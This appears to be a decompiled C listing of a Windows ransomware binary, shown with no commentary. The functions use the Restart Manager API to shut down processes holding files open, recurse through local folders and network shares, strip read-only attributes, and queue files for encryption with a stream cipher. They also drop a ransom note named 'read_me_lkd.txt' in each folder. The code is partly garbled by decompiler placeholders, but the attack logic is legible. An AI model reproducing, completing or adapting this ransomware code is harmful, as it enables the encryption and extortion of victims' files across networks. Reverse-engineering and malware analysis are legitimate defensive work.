                v16 = v15 + 1;
                v17 = 4;
                v18 = *(int32_t *)(*v2 + 4 * v15);
            }
        }
        // 0x404317
        *(char *)v13 = (char)v18;
        v14--;
        v12 = v17 - 1;
        v13--;
    }
    // 0x404323
    return result2;
}

// Address range: 0x404340 - 0x4045cc
int32_t function_404340(void) {
    int32_t v1 = __readfsdword(44); // 0x404346
    int32_t v2; // bp-100, 0x404340
    int32_t v3 = &v2; // 0x40434d
    int32_t v4 = (int32_t)g243; // 0x404355
    int32_t * v5 = (int32_t *)(*(int32_t *)v1 + 4); // 0x40435a
    int32_t v6 = v3; // 0x404360
    int32_t v7 = v4; // 0x404360
    if (*v5 < v4) {
        int16_t * v8 = (int16_t *)&g243; // bp-104, 0x404362
        int32_t v9 = function_405d02((int32_t *)&g243); // 0x404367
        v6 = v3;
        v7 = v9;
        if (g243 == (int16_t *)-1) {
            // 0x404378
            v8 = L"Rstrtmgr.dll";
            g249 = (int32_t)LoadLibraryW(L"Rstrtmgr.dll");
            int32_t v10 = function_405cb8((int32_t *)&g243); // 0x40438d
            v6 = (int32_t)&v8;
            v7 = v10;
        }
    }
    // 0x404395
    if (g249 == 0) {
        // 0x4045c4
        return v7 & -256;
    }
    int32_t v11 = v6 - 4; // 0x4043a7
    int32_t v12 = v11; // 0x4043b4
    if (g253 > *v5) {
        int32_t * v13 = (int32_t *)(v6 - 8); // 0x4043b6
        *v13 = (int32_t)&g253;
        function_405d02(&g266);
        v12 = v11;
        if (g253 == -1) {
            // 0x4043cc
            *v13 = (int32_t)"RmStartSession";
            int32_t v14 = v6 - 12; // 0x4043d1
            *(int32_t *)v14 = g249;
            int32_t (*func)() = GetProcAddress(&g266, (char *)&g266); // 0x4043d7
            *(int32_t *)(v6 - 16) = (int32_t)&g253;
            g247 = (int32_t)func;
            function_405cb8(&g266);
            v12 = v14;
        }
    }
    int32_t v15 = v12; // 0x4043f6
    if (g242 > *v5) {
        int32_t * v16 = (int32_t *)(v12 - 4); // 0x4043f8
        *v16 = (int32_t)&g242;
        function_405d02(&g266);
        v15 = v12;
        if (g242 == -1) {
            // 0x40440e
            *v16 = (int32_t)"RmRegisterResources";
            int32_t v17 = v12 - 8; // 0x404413
            *(int32_t *)v17 = g249;
            int32_t (*func2)() = GetProcAddress(&g266, (char *)&g266); // 0x404419
            *(int32_t *)(v12 - 12) = (int32_t)&g242;
            g252 = (int32_t)func2;
            function_405cb8(&g266);
            v15 = v17;
        }
    }
    int32_t v18 = v15; // 0x404438
    if (g248 > *v5) {
        int32_t * v19 = (int32_t *)(v15 - 4); // 0x40443a
        *v19 = (int32_t)&g248;
        function_405d02(&g266);
        v18 = v15;
        if (g248 == -1) {
            // 0x404450
            *v19 = (int32_t)"RmGetList";
            int32_t v20 = v15 - 8; // 0x404455
            *(int32_t *)v20 = g249;
            int32_t (*func3)() = GetProcAddress(&g266, (char *)&g266); // 0x40445b
            *(int32_t *)(v15 - 12) = (int32_t)&g248;
            g245 = (int32_t)func3;
            function_405cb8(&g266);
            v18 = v20;
        }
    }
    int32_t v21 = v18; // 0x40447a
    if (g246 > *v5) {
        int32_t * v22 = (int32_t *)(v18 - 4); // 0x40447c
        *v22 = (int32_t)&g246;
        function_405d02(&g266);
        v21 = v18;
        if (g246 == -1) {
            // 0x404492
            *v22 = (int32_t)"RmEndSession";
            int32_t v23 = v18 - 8; // 0x404497
            *(int32_t *)v23 = g249;
            int32_t (*func4)() = GetProcAddress(&g266, (char *)&g266); // 0x40449d
            *(int32_t *)(v18 - 12) = (int32_t)&g246;
            g251 = (int32_t)func4;
            function_405cb8(&g266);
            v21 = v23;
        }
    }
    int32_t v24 = v21; // 0x4044bc
    int32_t v25 = g244; // 0x4044bc
    if (g244 > *v5) {
        int32_t * v26 = (int32_t *)(v21 - 4); // 0x4044be
        *v26 = (int32_t)&g244;
        int32_t v27 = function_405d02(&g266); // 0x4044c3
        v24 = v21;
        v25 = v27;
        if (g244 == -1) {
            // 0x4044d4
            *v26 = (int32_t)"RmShutdown";
            int32_t v28 = v21 - 8; // 0x4044d9
            *(int32_t *)v28 = g249;
            int32_t (*func5)() = GetProcAddress(&g266, (char *)&g266); // 0x4044df
            *(int32_t *)(v21 - 12) = (int32_t)&g244;
            g250 = (int32_t)func5;
            int32_t v29 = function_405cb8(&g266); // 0x4044eb
            v24 = v28;
            v25 = v29;
        }
    }
    // 0x4044f3
    if (g247 == 0 | g252 == 0 | g245 == 0 || g251 == 0 || g250 == 0) {
        // 0x4045c4
        return v25 & -256;
    }
    int32_t * v30 = (int32_t *)v24; // 0x404536
    *v30 = 66;
    int32_t v31 = 0; // bp-8, 0x40453b
    int32_t * v32 = (int32_t *)(v24 - 4); // 0x404542
    *v32 = 0;
    int32_t * v33 = (int32_t *)(v24 - 8); // 0x404544
    int32_t v34; // bp-92, 0x404340
    int32_t v35 = &v34; // 0x404544
    *v33 = v35;
    function_4071b0((int32_t *)v31, (int32_t)&g266, (int32_t)&g266);
    *v30 = v35;
    *v32 = 0;
    int32_t v36 = &v31; // 0x404553
    *v33 = v36;
    return v36 & -256;
}

// Address range: 0x4045d0 - 0x4047b2
int32_t function_4045d0(int32_t a1) {
    // 0x4045d0
    int32_t v1; // bp-616, 0x4045d0
    int32_t v2 = &v1; // 0x4045e4
    int32_t v3; // 0x4045d0
    int32_t v4; // 0x4045d0
    int32_t v5; // 0x4045d0
    int32_t v6; // 0x404696
    int32_t v7; // 0x4045f8
    if (a1 != 0) {
        int32_t * hHeap = GetProcessHeap(); // 0x4045f1
        int32_t v8 = (int32_t)hHeap; // bp-628, 0x4045f7
        int32_t * lpFileName = HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x4045f8
        v2 = &v8;
        if (lpFileName != NULL) {
            // 0x404608
            v7 = (int32_t)lpFileName;
            wnsprintfW();
            int16_t * v9 = (int16_t *)lpFileName; // bp-636, 0x404624
            int32_t v10 = (int32_t)&v9; // 0x404624
            int32_t lpFindFileData; // bp-612, 0x4045d0
            int32_t * v11 = FindFirstFileW((int16_t *)lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x404625
            v3 = v10;
            int32_t v12 = v10; // 0x404632
            if (v11 != (int32_t *)-1) {
                while (true) {
                  lab_0x404638:;
                    int32_t v13 = v3;
                    *(int32_t *)(v13 - 4) = v13 + 60;
                    *(int32_t *)(v13 - 8) = a1;
                    *(int32_t *)(v13 - 12) = (int32_t)L"%s\\%s";
                    *(int32_t *)(v13 - 16) = 0x7fff;
                    *(int32_t *)(v13 - 20) = v7;
                    wnsprintfW();
                    int32_t v14 = v13; // 0x404653
                    v4 = v13;
                    if ((*(char *)(v13 + 16) & 16) == 0) {
                        int32_t v15 = &g142;
                        int32_t v16 = v14;
                        *(int32_t *)(v16 - 4) = *(int32_t *)v15;
                        *(int32_t *)(v16 - 8) = v16 + 60;
                        int16_t * v17 = CharLowerW((int16_t *)&g266); // 0x404667
                        int32_t v18 = v16 - 12; // 0x40466d
                        *(int32_t *)v18 = (int32_t)v17;
                        int16_t * v19 = StrStrW((int16_t *)&g266, (int16_t *)&g266); // 0x40466e
                        v4 = v18;
                        while (v19 == NULL) {
                            int32_t v20 = v15 + 4; // 0x40467c
                            v14 = v18;
                            int32_t v21 = v20; // 0x404685
                            if (v20 == (int32_t)&g143) {
                                int32_t v22 = v16 - 16; // 0x404687
                                *(int32_t *)v22 = v7;
                                int32_t v23 = GetFileAttributesW((int16_t *)&g266); // 0x404688
                                v6 = v22;
                                if ((v23 & 1) == 0) {
                                    goto lab_0x40469d;
                                } else {
                                    // 0x404692
                                    *(int32_t *)(v16 - 20) = v23 & -2;
                                    v6 = v16 - 24;
                                    *(int32_t *)v6 = v7;
                                    SetFileAttributesW((int16_t *)&g266, (int32_t)&g266);
                                    goto lab_0x40469d;
                                }
                            }
                            v15 = v21;
                            v16 = v14;
                            *(int32_t *)(v16 - 4) = *(int32_t *)v15;
                            *(int32_t *)(v16 - 8) = v16 + 60;
                            v17 = CharLowerW((int16_t *)&g266);
                            v18 = v16 - 12;
                            *(int32_t *)v18 = (int32_t)v17;
                            v19 = StrStrW((int16_t *)&g266, (int16_t *)&g266);
                            v4 = v18;
                        }
                    }
                    goto lab_0x40473e;
                }
              lab_0x404755:
                // 0x404755
                v12 = v5 - 12;
                *(int32_t *)v12 = *(int32_t *)(v5 + 4);
                FindClose(&g266);
            }
            int32_t * v24 = (int32_t *)(v12 - 4); // 0x40475f
            *v24 = a1;
            int32_t * v25 = (int32_t *)(v12 - 8); // 0x404760
            *v25 = (int32_t)L"%s\\read_me_lkd.txt";
            int32_t v26 = v12 - 12; // 0x404765
            int32_t * v27 = (int32_t *)v26; // 0x404765
            *v27 = 0x7fff;
            *(int32_t *)(v12 - 16) = v7;
            wnsprintfW();
            *v24 = v7;
            *v25 = 0;
            *v27 = (int32_t)GetProcessHeap();
            HeapFree(&g266, (int32_t)&g266, &g266);
            v2 = v26;
        }
    }
    // 0x404792
    *(int32_t *)(v2 - 4) = 1;
    *(int32_t *)(v2 - 8) = (int32_t)&g240;
    InterlockedExchangeAdd(&g266, (int32_t)&g266);
    *(int32_t *)(v2 - 12) = a1;
    *(int32_t *)(v2 - 16) = 0;
    *(int32_t *)(v2 - 20) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    return 0;
  lab_0x40473e:
    // 0x40473e
    v5 = v4;
    *(int32_t *)(v5 - 4) = v5 + 16;
    int32_t v28 = v5 - 8; // 0x404743
    *(int32_t *)v28 = *(int32_t *)(v5 + 12);
    bool v29 = FindNextFileW(&g266, (struct _WIN32_FIND_DATAW *)&g266); // 0x404747
    v3 = v28;
    if (!v29) {
        // break -> 0x404755
        goto lab_0x404755;
    }
    goto lab_0x404638;
  lab_0x40469d:;
    int32_t v30 = v6;
    *(int32_t *)(v30 - 4) = 0;
    *(int32_t *)(v30 - 8) = 0;
    *(int32_t *)(v30 - 12) = 3;
    *(int32_t *)(v30 - 16) = 0;
    *(int32_t *)(v30 - 20) = 1;
    *(int32_t *)(v30 - 24) = -0x40000000;
    int32_t v31 = v30 - 28; // 0x4046b2
    *(int32_t *)v31 = v7;
    int32_t * v32 = CreateFileW((int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, (struct _SECURITY_ATTRIBUTES *)&g266, (int32_t)&g266, (int32_t)&g266, &g266); // 0x4046b3
    int32_t * v33 = v32; // 0x4046ba
    int32_t v34 = v31; // 0x4046ba
    if (v32 != (int32_t *)-1) {
        goto lab_0x4046ec;
    } else {
        goto lab_0x4046c0;
    }
  lab_0x4046ec:
    // 0x4046ec
    *(int32_t *)(v34 - 4) = 1;
    *(int32_t *)(v34 - 8) = (int32_t)&g238;
    InterlockedExchangeAdd(&g266, (int32_t)&g266);
    int32_t * v35 = (int32_t *)(v34 - 12); // 0x4046f9
    *v35 = 0x10004;
    int32_t v36 = function_405b2b((int32_t)&g266); // 0x4046fe
    int32_t * v37 = (int32_t *)(v34 - 16); // 0x404703
    *v37 = 0x10004;
    int32_t * v38 = (int32_t *)(v34 - 20); // 0x40470a
    *v38 = 0;
    int32_t * v39 = (int32_t *)(v34 - 24); // 0x40470c
    *v39 = v36;
    function_4071b0(&g266, (int32_t)&g266, (int32_t)&g266);
    *(int32_t *)v36 = (int32_t)v33;
    *v35 = 0x7fff;
    *v37 = v7;
    *v38 = v36 + 4;
    lstrcpynW((int16_t *)&g266, (int16_t *)&g266, (int32_t)&g266);
    *v39 = 0;
    *(int32_t *)(v34 - 28) = v36;
    int32_t v40 = v34 - 32; // 0x40472a
    *(int32_t *)v40 = 0x401410;
    QueueUserWorkItem((int32_t (*)(int32_t *))&g266, &g266, (int32_t)&g266);
    v4 = v40;
    goto lab_0x40473e;
  lab_0x4046c0:
    // 0x4046c0
    if ((char)function_404340() == 1) {
        goto lab_0x4046c0;
    } else {
        // 0x4046cb
        *(int32_t *)(v30 - 32) = 0;
        *(int32_t *)(v30 - 36) = 0;
        *(int32_t *)(v30 - 40) = 3;
        *(int32_t *)(v30 - 44) = 0;
        *(int32_t *)(v30 - 48) = 1;
        *(int32_t *)(v30 - 52) = -0x40000000;
        int32_t v41 = v30 - 56; // 0x4046da
        *(int32_t *)v41 = v7;
        int32_t * v42 = CreateFileW((int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, (struct _SECURITY_ATTRIBUTES *)&g266, (int32_t)&g266, (int32_t)&g266, &g266); // 0x4046db
        v33 = v42;
        v34 = v41;
        if (v42 != (int32_t *)-1) {
            goto lab_0x4046ec;
        } else {
            // 0x4046e4
            GetLastError();
            v4 = v41;
            goto lab_0x40473e;
        }
    }
}

// Address range: 0x4047c0 - 0x404985
int32_t function_4047c0(int32_t lpString2) {
    int32_t v1 = lpString2;
    if (lpString2 == 0) {
        // 0x40497c
        int32_t result; // 0x4047c0
        return result;
    }
    int32_t * lpString1 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x4047eb
    lstrcpyW((int16_t *)lpString1, (int16_t *)lpString2);
    InterlockedExchangeAdd(&g241, 1);
    QueueUserWorkItem((int32_t (*)(int32_t *))0x4045d0, lpString1, 0);
    int32_t * lpFileName = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x404820
    int32_t result2 = (int32_t)lpFileName; // 0x404820
    if (lpFileName == NULL) {
        // 0x40497c
        return result2;
    }
    // 0x40482c
    wnsprintfW();
    int16_t * v2 = (int16_t *)lpFileName; // bp-676, 0x404848
    int32_t v3 = (int32_t)&v2; // 0x404848
    char lpFindFileData; // bp-600, 0x4047c0
    int32_t * v4 = FindFirstFileW((int16_t *)lpFileName, (struct _WIN32_FIND_DATAW *)&lpFindFileData); // 0x404849
    v1 = (int32_t)v4;
    int32_t v5 = v3; // 0x404855
    int32_t v6; // 0x4047c0
    int32_t v7; // 0x4047c0
    int32_t v8; // 0x4047c0
    if (v4 != (int32_t *)-1) {
        // 0x404861
        int32_t v9; // bp-556, 0x4047c0
        int32_t v10 = &v9; // 0x404867
        v6 = v3;
        while (true) {
          lab_0x404861:;
            int32_t * v11 = (int32_t *)(v6 - 4); // 0x404867
            *v11 = v10;
            int32_t v12 = v6 - 8; // 0x404868
            int32_t * v13 = (int32_t *)v12; // 0x404868
            *v13 = lpString2;
            int32_t * v14 = (int32_t *)(v6 - 12); // 0x404869
            *v14 = (int32_t)L"%s\\%s";
            int32_t v15 = v6 - 16; // 0x40486e
            int32_t * v16 = (int32_t *)v15; // 0x40486e
            *v16 = 0x7fff;
            *(int32_t *)(v6 - 20) = result2;
            wnsprintfW();
            v7 = v6;
            if ((lpFindFileData & 16) != 0) {
                // 0x404886
                *v11 = (int32_t)L"..";
                *v13 = v10;
                int32_t v17 = lstrcmpW((int16_t *)&g266, (int16_t *)&g266); // 0x404892
                v7 = v12;
                if (v17 != 0) {
                    // 0x404898
                    *v14 = (int32_t)&g75;
                    *v16 = v10;
                    int32_t v18 = lstrcmpW((int16_t *)&g266, (int16_t *)&g266); // 0x4048a4
                    int32_t v19 = v15; // 0x4048a8
                    v7 = v15;
                    if (v18 != 0) {
                        int32_t v20 = &g143;
                        int32_t v21 = v19;
                        *(int32_t *)(v21 - 4) = *(int32_t *)v20;
                        *(int32_t *)(v21 - 8) = v10;
                        int16_t * v22 = CharLowerW((int16_t *)&g266); // 0x4048b9
                        int32_t v23 = v21 - 12; // 0x4048bf
                        *(int32_t *)v23 = (int32_t)v22;
                        int16_t * v24 = StrStrW((int16_t *)&g266, (int16_t *)&g266); // 0x4048c0
                        v7 = v23;
                        while (v24 == NULL) {
                            int32_t v25 = v20 + 4; // 0x4048ca
                            v19 = v23;
                            int32_t v26 = v25; // 0x4048d3
                            if (v25 == (int32_t)&g144) {
                                int32_t v27 = v21 - 16; // 0x4048d5
                                *(int32_t *)v27 = result2;
                                function_4047c0((int32_t)&g266);
                                v7 = v27;
                                goto lab_0x4048e6;
                            }
                            v20 = v26;
                            v21 = v19;
                            *(int32_t *)(v21 - 4) = *(int32_t *)v20;
                            *(int32_t *)(v21 - 8) = v10;
                            v22 = CharLowerW((int16_t *)&g266);
                            v23 = v21 - 12;
                            *(int32_t *)v23 = (int32_t)v22;
                            v24 = StrStrW((int16_t *)&g266, (int16_t *)&g266);
                            v7 = v23;
                        }
                    }
                }
            }
            goto lab_0x4048e6;
        }
      lab_0x4048fe:
        // 0x4048fe
        v5 = v8 - 12;
        *(int32_t *)v5 = v1;
        FindClose(&g266);
    }
    int32_t * v28 = (int32_t *)(v5 - 4); // 0x404907
    *v28 = lpString2;
    int32_t * v29 = (int32_t *)(v5 - 8); // 0x404908
    *v29 = (int32_t)L"%s\\read_me_lkd.txt";
    int32_t * v30 = (int32_t *)(v5 - 12); // 0x40490d
    *v30 = 0x7fff;
    int32_t * v31 = (int32_t *)(v5 - 16); // 0x404912
    *v31 = result2;
    wnsprintfW();
    *v28 = 0;
    *v29 = 128;
    *v30 = 1;
    *v31 = 0;
    *(int32_t *)(v5 - 20) = 0;
    *(int32_t *)(v5 - 24) = 0x40000000;
    int32_t v32 = v5 - 28; // 0x40492e
    *(int32_t *)v32 = result2;
    int32_t * v33 = CreateFileW((int16_t *)&g266, (int32_t)&g266, (int32_t)&g266, (struct _SECURITY_ATTRIBUTES *)&g266, (int32_t)&g266, (int32_t)&g266, &g266); // 0x40492f
    int32_t v34 = v32; // 0x40493a
    if (v33 != (int32_t *)-1) {
        int32_t v35 = (int32_t)v33; // 0x40492f
        *(int32_t *)(v5 - 32) = 0;
        *(int32_t *)(v5 - 36) = (int32_t)&v1;
        int32_t v36 = g147 >= 8 ? (int32_t)g145 : (int32_t)&g145; // 0x404953
        *(int32_t *)(v5 - 40) = 2 * g146;
        *(int32_t *)(v5 - 44) = v36;
        *(int32_t *)(v5 - 48) = v35;
        WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266);
        v34 = v5 - 52;
        *(int32_t *)v34 = v35;
        CloseHandle(&g266);
    }
    // 0x40496c
    *(int32_t *)(v34 - 4) = result2;
    *(int32_t *)(v34 - 8) = 0;
    *(int32_t *)(v34 - 12) = (int32_t)GetProcessHeap();
    // 0x40497c
    return HeapFree(&g266, (int32_t)&g266, &g266);
  lab_0x4048e6:
    // 0x4048e6
    v8 = v7;
    *(int32_t *)(v8 - 4) = (int32_t)&lpFindFileData;
    int32_t v37 = v8 - 8; // 0x4048ed
    *(int32_t *)v37 = v1;
    bool v38 = FindNextFileW(&g266, (struct _WIN32_FIND_DATAW *)&g266); // 0x4048f0
    v6 = v37;
    if (!v38) {
        // break -> 0x4048fe
        goto lab_0x4048fe;
    }
    goto lab_0x404861;
}

// Address range: 0x404990 - 0x404a5e
int32_t function_404990(int32_t lpNetResource) {
    int32_t lpcCount = -1; // bp-8, 0x40499c
    int32_t lpBufferSize = 0x4000; // bp-12, 0x4049a7
    int32_t lphEnum; // bp-16, 0x404990
    int32_t result = WNetOpenEnumW(2, 0, 19, (struct _NETRESOURCEW *)lpNetResource, (int32_t **)&lphEnum); // 0x4049b4
    if (result != 0) {
        // 0x404a55
        return result;
    }
    int32_t * hHeap = GetProcessHeap(); // 0x4049c7
    int32_t v1 = (int32_t)hHeap; // bp-64, 0x4049cd
    int32_t * lpBuffer = HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x4049ce
    int32_t v2 = &v1; // 0x4049d8
    if (lpBuffer != NULL) {
        int32_t v3 = (int32_t)lpBuffer; // 0x4049ce
        int32_t v4 = lphEnum; // bp-80, 0x4049e3
        int32_t v5 = &v4; // 0x4049e3
        int32_t v6 = WNetEnumResourceW((int32_t *)lphEnum, &lpcCount, lpBuffer, &lpBufferSize); // 0x4049e6
        int32_t v7 = v5; // 0x4049ee
        if (v6 == 0) {
            int32_t v8 = v5; // 0x4049f5
            int32_t v9; // 0x404990
            int32_t v10; // 0x404990
            int32_t v11; // 0x404990
            int32_t v12; // 0x404990
            int32_t v13; // 0x404990
            int32_t v14; // 0x404a16
            int32_t v15; // 0x404a0e
            int32_t v16; // 0x404a1d
            if (lpcCount != 0) {
                v11 = v3 + 20;
                if ((*(char *)(v11 - 8) & 2) == 0) {
                    // 0x404a16
                    v14 = v5 - 4;
                    *(int32_t *)v14 = *(int32_t *)v11;
                    function_4047c0((int32_t)&g266);
                    v13 = v14;
                } else {
                    // 0x404a06
                    v15 = v5 - 4;
                    *(int32_t *)v15 = v11 - 20;
                    function_404990((int32_t)&g266);
                    v13 = v15;
                }
                // 0x404a1d
                v16 = 1;
                v10 = v11 + 32;
                v9 = v16;
                v8 = v13;
                while (v16 < lpcCount) {
                    // 0x404a00
                    v11 = v10;
                    v12 = v13;
                    if ((*(char *)(v11 - 8) & 2) == 0) {
                        // 0x404a16
                        v14 = v12 - 4;
                        *(int32_t *)v14 = *(int32_t *)v11;
                        function_4047c0((int32_t)&g266);
                        v13 = v14;
                    } else {
                        // 0x404a06
                        v15 = v12 - 4;
                        *(int32_t *)v15 = v11 - 20;
                        function_404990((int32_t)&g266);
                        v13 = v15;
                    }
                    // 0x404a1d
                    v16 = v9 + 1;
                    v10 = v11 + 32;
                    v9 = v16;
                    v8 = v13;
                }
            }
            // 0x404a26
            *(int32_t *)(v8 - 4) = (int32_t)&lpBufferSize;
            *(int32_t *)(v8 - 8) = v3;
            *(int32_t *)(v8 - 12) = (int32_t)&lpcCount;
            int32_t v17 = v8 - 16; // 0x404a2f
            *(int32_t *)v17 = lphEnum;
            int32_t v18 = WNetEnumResourceW(&g266, &g266, &g266, &g266); // 0x404a32
            v7 = v17;
            while (v18 == 0) {
                int32_t v19 = v17; // 0x4049f5
                v8 = v17;
                if (lpcCount != 0) {
                    v11 = v3 + 20;
                    v12 = v19;
                    if ((*(char *)(v11 - 8) & 2) == 0) {
                        // 0x404a16
                        v14 = v12 - 4;
                        *(int32_t *)v14 = *(int32_t *)v11;
                        function_4047c0((int32_t)&g266);
                        v13 = v14;
                    } else {
                        // 0x404a06
                        v15 = v12 - 4;
                        *(int32_t *)v15 = v11 - 20;
                        function_404990((int32_t)&g266);
                        v13 = v15;
                    }
                    // 0x404a1d
                    v16 = 1;
                    v10 = v11 + 32;
                    v9 = v16;
                    v8 = v13;
                    while (v16 < lpcCount) {
                        // 0x404a00
                        v11 = v10;
                        v12 = v13;
                        if ((*(char *)(v11 - 8) & 2) == 0) {
                            // 0x404a16
                            v14 = v12 - 4;
                            *(int32_t *)v14 = *(int32_t *)v11;
                            function_4047c0((int32_t)&g266);
                            v13 = v14;
                        } else {
                            // 0x404a06
                            v15 = v12 - 4;
                            *(int32_t *)v15 = v11 - 20;
                            function_404990((int32_t)&g266);
                            v13 = v15;
                        }
                        // 0x404a1d
                        v16 = v9 + 1;
                        v10 = v11 + 32;
                        v9 = v16;
                        v8 = v13;
                    }
                }
                // 0x404a26
                *(int32_t *)(v8 - 4) = (int32_t)&lpBufferSize;
                *(int32_t *)(v8 - 8) = v3;
                *(int32_t *)(v8 - 12) = (int32_t)&lpcCount;
                v17 = v8 - 16;
                *(int32_t *)v17 = lphEnum;
                v18 = WNetEnumResourceW(&g266, &g266, &g266, &g266);
                v7 = v17;
            }
        }
        // 0x404a3c
        *(int32_t *)(v7 - 4) = v3;
        *(int32_t *)(v7 - 8) = 0;
        int32_t * v20 = GetProcessHeap(); // 0x404a3f
        v2 = v7 - 12;
        *(int32_t *)v2 = (int32_t)v20;
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    // 0x404a4c
    *(int32_t *)(v2 - 4) = lphEnum;
    // 0x404a55
    return WNetCloseEnum(&g266);
}

// Address range: 0x404a60 - 0x404a8a
int32_t function_404a60(void) {
    // 0x404a60
    if (g240 >= g241) {
        // 0x404a89
        return g241;
    }
    // 0x404a6d
    int32_t v1; // bp-4, 0x404a60
    int32_t v2 = &v1; // 0x404a6e
    v2 -= 4;
    *(int32_t *)v2 = 0x1388;
    Sleep((int32_t)&g266);
    while (g240 < g241) {
        // 0x404a74
        v2 -= 4;
        *(int32_t *)v2 = 0x1388;
        Sleep((int32_t)&g266);
    }
    // 0x404a89
    return g241;
}

// Address range: 0x404a90 - 0x404d9e
int32_t function_404a90(uint32_t a1, int32_t a2, int32_t a3) {
    // 0x404a90
    int32_t v1; // bp-4, 0x404a90
    int32_t v2 = &v1; // 0x404a91
    int32_t v3 = v2 - 124; // 0x404ac1
    int32_t v4 = 0; // 0x404aae
    int32_t v5 = 4 * v4; // 0x404abd
    v4++;
    int32_t v6; // 0x404a90
    *(int32_t *)(v5 + v3) = *(int32_t *)(v5 + v6);
    while (v4 != 16) {
        // 0x404ab0
        v5 = 4 * v4;
        v4++;
        *(int32_t *)(v5 + v3) = *(int32_t *)(v5 + v6);
    }
    int32_t v7 = a1 / 2; // 0x404acd
    if (a1 >= 2) {
        v7--;
        while (v7 != 0) {
            // 0x404b30
            v7--;
        }
    }
    // 0x404d17
    int32_t v8; // 0x404a90
    int32_t v9 = v8 + 4; // 0x404d22
    int32_t v10 = v6 + 12; // 0x404d22
    uint32_t v11 = 2;
    int32_t v12 = 4 * v11; // 0x404d24
    int32_t v13 = *(int32_t *)(v10 - 12); // 0x404d40
    *(int32_t *)(v9 - 4) = v13 + *(int32_t *)(v12 - 8 + v3);
    int32_t v14 = *(int32_t *)(v6 - v8 + v9); // 0x404d58
    *(int32_t *)v9 = v14 + *(int32_t *)((v12 - 4 & -16 | 4) + v3);
    int32_t v15 = *(int32_t *)(v10 - 4); // 0x404d71
    *(int32_t *)(v9 + 4) = v15 + *(int32_t *)(v12 + v3);
    int32_t v16 = *(int32_t *)v10; // 0x404d89
    *(int32_t *)(v9 + 8) = v16 + *(int32_t *)(v2 - 120 + v12);
    int32_t v17 = v11 + 4; // 0x404d95
    v9 += 16;
    v10 += 16;
    while (v11 < 14) {
        // 0x404d24
        v11 = v17;
        v12 = 4 * v11;
        v13 = *(int32_t *)(v10 - 12);
        *(int32_t *)(v9 - 4) = v13 + *(int32_t *)(v12 - 8 + v3);
        v14 = *(int32_t *)(v6 - v8 + v9);
        *(int32_t *)v9 = v14 + *(int32_t *)((v12 - 4 & -16 | 4) + v3);
        v15 = *(int32_t *)(v10 - 4);
        *(int32_t *)(v9 + 4) = v15 + *(int32_t *)(v12 + v3);
        v16 = *(int32_t *)v10;
        *(int32_t *)(v9 + 8) = v16 + *(int32_t *)(v2 - 120 + v12);
        v17 = v11 + 4;
        v9 += 16;
        v10 += 16;
    }
    // 0x404d97
    return 18;
}

// Address range: 0x404da0 - 0x404fc2
int32_t function_404da0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x404da0
    int32_t v1; // 0x404da0
    int32_t v2; // 0x404da0
    function_404a90(a5, v1, v2);
    int32_t v3 = 0;
    int32_t v4; // bp-4, 0x404da0
    uint32_t v5 = *(int32_t *)((int32_t)&v4 - 128 + (v3 & 0x7ffffffc)); // 0x404fad
    int32_t v6; // 0x404da0
    *(char *)(v3 + v6) = (char)(v5 >> (8 * v3 & 24));
    int32_t v7 = v3 + 1; // 0x404fb6
    while (v7 != 64) {
        // 0x404fa0
        v3 = v7;
        v5 = *(int32_t *)((int32_t)&v4 - 128 + (v3 & 0x7ffffffc));
        *(char *)(v3 + v6) = (char)(v5 >> (8 * v3 & 24));
        v7 = v3 + 1;
    }
    // 0x404fbc
    return 64;
}

// Address range: 0x404fd0 - 0x40502c
int32_t function_404fd0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x404fd0
    int32_t v1; // bp-96, 0x404fd0
    int32_t v2 = &v1; // 0x404fd8
    uint32_t v3 = 0;
    int32_t v4; // 0x404fd0
    int32_t v5 = v4; // 0x404ff1
    if (v3 == 0) {
        // 0x404ff3
        *(int32_t *)(v2 - 4) = a3;
        *(int32_t *)(v2 - 8) = 0;
        *(int32_t *)(v2 - 12) = v3 / 64;
        *(int32_t *)(v2 - 16) = a2;
        *(int32_t *)(v2 - 20) = a1;
        v5 = function_404da0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    }
    // 0x405018
    int32_t v6; // bp-4, 0x404fd0
    unsigned char v7 = *(char *)((int32_t)&v6 - 76 + v3); // 0x405018
    int32_t result = v5 & -256 | (int32_t)v7; // 0x405018
    int32_t v8; // 0x404fd0
    char * v9 = (char *)(v3 + v8); // 0x40501c
    *v9 = *v9 ^ v7;
    int32_t v10 = v3 + 1; // 0x40501f
    while (v10 != 32) {
        // 0x404ff1
        v3 = v10;
        v5 = result;
        if (v3 == 0) {
            // 0x404ff3
            *(int32_t *)(v2 - 4) = a3;
            *(int32_t *)(v2 - 8) = 0;
            *(int32_t *)(v2 - 12) = v3 / 64;
            *(int32_t *)(v2 - 16) = a2;
            *(int32_t *)(v2 - 20) = a1;
            v5 = function_404da0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        }
        // 0x405018
        v7 = *(char *)((int32_t)&v6 - 76 + v3);
        result = v5 & -256 | (int32_t)v7;
        v9 = (char *)(v3 + v8);
        *v9 = *v9 ^ v7;
        v10 = v3 + 1;
    }
    // 0x405025
    return result;
}

// Address range: 0x405030 - 0x405232
int32_t function_405030(int32_t * a1, int32_t a2) {
    // 0x405030
    int32_t v1; // 0x405030
    __asm_rdtsc(v1);
    __asm_rdtsc_8(0);
    __asm_rdtsc_9(0);
    uint32_t processId = GetCurrentProcessId(); // 0x405046
    if (processId == 0 || GetCurrentThreadId() == 0 || GetTickCount() == 0) {
        // 0x40522b
        return 0;
    }
    // 0x405075
    int32_t lpSystemTimeAsFileTime; // bp-32, 0x405030
    GetSystemTimeAsFileTime((struct _FILETIME *)&lpSystemTimeAsFileTime);
